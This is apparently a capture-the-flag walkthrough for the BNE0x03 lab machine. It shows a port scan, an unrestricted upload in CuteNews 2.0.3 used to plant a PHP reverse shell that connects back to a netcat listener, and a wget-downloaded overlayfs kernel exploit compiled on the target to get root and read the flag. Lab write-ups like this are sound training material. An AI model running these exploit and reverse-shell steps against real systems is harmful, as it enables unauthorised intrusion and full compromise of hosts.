# BNE0x03
Initial recon shows a single port open(80) with a web server running.
```console
root@kali:~# unicornscan -I -mT 192.168.2.104:a;unicornscan -I -mU 192.168.2.104:a
TCP open 192.168.2.104:80  ttl 64
TCP open                    http[   80]         from 192.168.2.104  ttl 64
```
The web server is serving CuteNews 2.0.3. A quick google search shows this version is vulnerable to a [file upload vulnerability](https://www.exploit-db.com/exploits/37474/). First we'll have to create a user account, login and browse to the "Personal Options" section under the dashboard to upload our [php reverse shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell). In the advisory it's mentioned that you need to modify post request to rename the image but I didn't have to do this and was able to directly upload a php file. Luckily for us the uploads folder where the php reverse shell has been placed has directory listing enabled so we can simply browse to the folder and trigger the reverse shell. Even if directory listings was disabled for the uplaods folder the files have a predictable filename of `avatar_$USERNAME_$FILENAME`.
```console
root@kali:~# curl http://192.168.2.104/uploads/avatar_a_prs.php
root@kali:~# nc -lvvp 443
listening on [any] 443 ...
connect to [192.168.2.103] from simple.kuruwita.org [192.168.2.104] 57433
Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
 02:38:09 up 10 min,  0 users,  load average: 0.00, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```
A quick google of the kernel version shows that it's vulnerable to an [overlayfs privledge escalation vulnerability](https://www.exploit-db.com/exploits/37292/). We find that conviently the server has gcc installed so we can simply download and compile the exploit on the server
```console
$ gcc
gcc: fatal error: no input files
compilation terminated.
$ cd /tmp
$ wget https://www.kernel-exploits.com/media/ofs_32.c
--2016-05-01 02:40:17--  https://www.kernel-exploits.com/media/ofs_32.c
Resolving www.kernel-exploits.com (www.kernel-exploits.com)... 104.31.66.163, 104.31.67.163
Connecting to www.kernel-exploits.com (www.kernel-exploits.com)|104.31.66.163|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5123 (5.0K) [text/x-csrc]
Saving to: 'ofs_32.c'

     0K .....                                                 100% 8.11M=0.001s

2016-05-01 02:40:18 (8.11 MB/s) - 'ofs_32.c' saved [5123/5123]

$ gcc ofs_32.c
$ ls
a.out
ofs_32.c
$ ./a.out
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
flag.txt
# cat flag.txt
U wyn teh Interwebs!!1eleven11!!1!
Hack the planet!
```
The flag is **U wyn teh Interwebs!!1eleven11!!1!**

**Hack the planet!**
